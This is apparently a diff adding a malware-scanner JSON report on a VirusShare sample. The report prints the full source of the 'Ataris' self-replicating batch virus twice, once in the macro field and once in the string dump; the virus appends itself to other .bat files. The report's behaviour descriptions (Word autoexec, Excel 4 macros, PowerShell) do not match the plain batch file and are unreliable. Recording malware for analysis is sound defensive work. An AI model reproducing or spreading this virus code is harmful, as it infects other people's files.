@@ -1,0 +1,62 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "autoexec": "Runs when the Word document is opened",
+            "call": "May call a DLL using Excel 4 Macros",
+            "command": "May run PowerShell commands"
+        },
+        "macro": "::Ataris BAT.Ataris 3\n@echo off%_Ataris%\nif '%1=='Ataris goto Ataris%2\nset Ataris=%0.bat\nif not exist %Ataris% set Ataris=%0\nif '%Ataris%==' set Ataris=autoexec.bat\nif not exist %Ataris% goto eAtaris\ncommand /c %Ataris% Ataris vir\n:eAtaris\nset Ataris=\nif exist \\!Ataris.bat del \\!Ataris.bat\ngoto Atarisend\n:Atarisxt\necho.>\\!Ataris.bat\n\\!Ataris.bat\n:Atarisvir\nfor %%a in (*.bat) do call %Ataris% Ataris i %%a\nexit Ataris\n:Atarisi\nfind \"Ataris\"<%3>nul\nif not errorlevel 1 goto Atarisxt\nfind \"Ataris\"<%Ataris%>Ataris$\ntype %3>>Ataris$\nmove Ataris$ %3>nul\ngoto Atarisxt\n:Atarisend\n::**** HOST ****"
+    },
+    "filename": "VirusShare_04637b290532bfe57b79f09eba208302",
+    "filesize": 621,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "04637b290532bfe57b79f09eba208302",
+        "sha1": "8259504c8179e80c314e6bf16500764febfc3563",
+        "sha256": "ff0065f4fc2631897de5cad7fc58804171ec5b285107cd65504e7a132d3b2a88"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "::Ataris BAT.Ataris 3",
+            "@echo off%_Ataris%",
+            "if '%1=='Ataris goto Ataris%2",
+            "set Ataris=%0.bat",
+            "if not exist %Ataris% set Ataris=%0",
+            "if '%Ataris%==' set Ataris=autoexec.bat",
+            "if not exist %Ataris% goto eAtaris",
+            "command /c %Ataris% Ataris vir",
+            ":eAtaris",
+            "set Ataris=",
+            "if exist \\!Ataris.bat del \\!Ataris.bat",
+            "goto Atarisend",
+            ":Atarisxt",
+            "echo.>\\!Ataris.bat",
+            "\\!Ataris.bat",
+            ":Atarisvir",
+            "for %%a in (*.bat) do call %Ataris% Ataris i %%a",
+            "exit Ataris",
+            ":Atarisi",
+            "find \"Ataris\"<%3>nul",
+            "if not errorlevel 1 goto Atarisxt",
+            "find \"Ataris\"<%Ataris%>Ataris$",
+            "type %3>>Ataris$",
+            "move Ataris$ %3>nul",
+            "goto Atarisxt",
+            ":Atarisend",
+            "::**** HOST ****"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.272609",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
